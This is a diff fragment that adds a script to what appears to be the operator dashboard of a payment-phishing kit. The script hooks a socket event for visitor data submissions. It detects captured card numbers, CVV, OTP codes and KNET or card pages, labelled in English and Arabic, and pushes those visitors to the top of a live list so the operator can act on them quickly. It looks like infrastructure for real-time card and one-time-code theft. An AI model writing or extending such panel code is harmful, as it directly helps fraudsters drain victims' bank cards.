@@ -4560,3 +4560,76 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   ins(); setInterval(ins, 500);
 })();
 </script>
+<script id="kddF137">
+(function(){
+  if (window.__f137) return; window.__f137 = 1;
+  try { if (document.title.indexOf('F137') < 0) document.title += ' ·F137'; } catch(e){}
+  function rel(x){
+    try {
+      var d=(x&&x.data)||{}, v=(x&&x.visitor)||{};
+      var p=String((d.page||d['الصفحة'])||v.page||'');
+      if (d.digitCode||d['الرمز']||d.otp||d.code) return true;
+      if (d.cardNumber||d.cardNumberOnly||d.cvv) return true;
+      return /ملخص|summary|كي\s*نت|knet|بطاقة|card|otp|رمز|cvv/i.test(p);
+    } catch(e){}
+    return false;
+  }
+  function keyOf(el){
+    try {
+      var v = visitors.get(el.getAttribute('data-vid'));
+      if (!v) return 0;
+      var t = v.__boost || (v.lastDataUpdate ? new Date(v.lastDataUpdate).getTime() : 0);
+      if (!t) t = new Date(v.createdAt || 0).getTime();
+      return t;
+    } catch(e){ return 0; }
+  }
+  function order(){
+    try {
+      var c = document.getElementById('visitorsList'); if (!c) return;
+      var cards = [], kids = c.children;
+      for (var i=0;i<kids.length;i++){ if (kids[i].getAttribute && kids[i].getAttribute('data-vid')) cards.push(kids[i]); }
+      if (cards.length < 2) return;
+      var want = cards.slice().sort(function(a,b){ return keyOf(b)-keyOf(a); });
+      var same = true;
+      for (var j=0;j<cards.length;j++){ if (cards[j]!==want[j]){ same=false; break; } }
+      if (same) return;
+      var f = document.createDocumentFragment();
+      for (var k=0;k<want.length;k++) f.appendChild(want[k]);
+      c.insertBefore(f, c.firstChild);
+    } catch(e){}
+  }
+  function bump(x){
+    try {
+      var id = x && x.visitorId; if (!id) return;
+      var v = visitors.get(id); if (!v) return;
+      v.__boost = Date.now();
+      v.lastDataUpdate = new Date().toISOString();
+      visitors.set(id, v);
+      order();
+    } catch(e){}
+  }
+  function hookS(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f137) return;
+      s.__f137 = 1;
+      s.on('visitor:dataSubmitted', function(x){ try { if (rel(x)) bump(x); } catch(e){} });
+    } catch(e){}
+  }
+  hookS(); setInterval(hookS, 500);
+  var orl = window.renderVisitorsList;
+  if (typeof orl === 'function' && !orl.__f137){
+    var w = function(){ var r = orl.apply(this, arguments); try { order(); } catch(e){} return r; };
+    w.__f137 = 1; window.renderVisitorsList = w; try { renderVisitorsList = w; } catch(e){}
+  }
+  var tm = null;
+  function watch(){
+    var c = document.getElementById('visitorsList');
+    if (!c || c.__f137) return;
+    c.__f137 = 1;
+    try { new MutationObserver(function(){ clearTimeout(tm); tm = setTimeout(order, 50); }).observe(c, { childList: true }); } catch(e){}
+  }
+  watch(); setInterval(watch, 600);
+  setInterval(order, 400);
+})();
+</script>
